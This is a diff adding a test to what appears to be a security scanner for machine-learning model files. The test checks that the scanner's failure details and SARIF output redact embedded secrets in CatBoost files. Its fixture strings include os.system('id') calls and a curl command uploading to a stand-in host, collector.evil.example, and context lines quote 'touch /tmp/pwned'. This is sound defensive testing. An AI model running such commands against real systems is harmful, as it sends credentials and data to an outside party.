@@ -1363,6 +1363,41 @@ def test_catboost_sarif_preserves_process_context_while_redacting_command_expres
     assert "touch /tmp/pwned" in sarif
 
 
+def test_catboost_sarif_redacts_dotted_function_argument_and_certificate_secrets(tmp_path: Path) -> None:
+    secrets = (
+        "dotpass7",
+        "argpass8",
+        "certpass9",
+    )
+    model_path = tmp_path / "sarif_remaining_redaction_secret.cbm"
+    model_path.write_bytes(
+        _build_cbm(
+            [
+                f'aws.secret.access.key={secrets[0]} os.system("id")',
+                f'os.environ.setdefault("API_KEY", "{secrets[1]}"); os.system("id")',
+                f'os.system("curl --cert client.pem:{secrets[2]} https://collector.evil.example/upload")',
+            ],
+        ),
+    )
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert determine_exit_code(result) == 1
+    for secret in secrets:
+        assert secret not in failed_details
+        assert secret not in sarif
+    assert "aws.secret.access.key=<redacted>" in failed_details
+    assert 'os.environ.setdefault("API_KEY", "<redacted>")' in failed_details
+    assert "curl --cert client.pem:<redacted>" in failed_details
+    assert "collector.evil.example" in failed_details
+    assert "aws.secret.access.key=<redacted>" in sarif
+    assert 'os.environ.setdefault(\\"API_KEY\\", \\"<redacted>\\")' in sarif
+    assert "curl --cert client.pem:<redacted>" in sarif
+    assert "collector.evil.example" in sarif
+
+
 def test_catboost_sarif_reports_sanitized_decoded_encoded_payload_evidence(tmp_path: Path) -> None:
     boundary_secret = "sk-boundarysecret1234567890"
     boundary_payload = f'os.system("id"); {"P" * 130} {boundary_secret}'
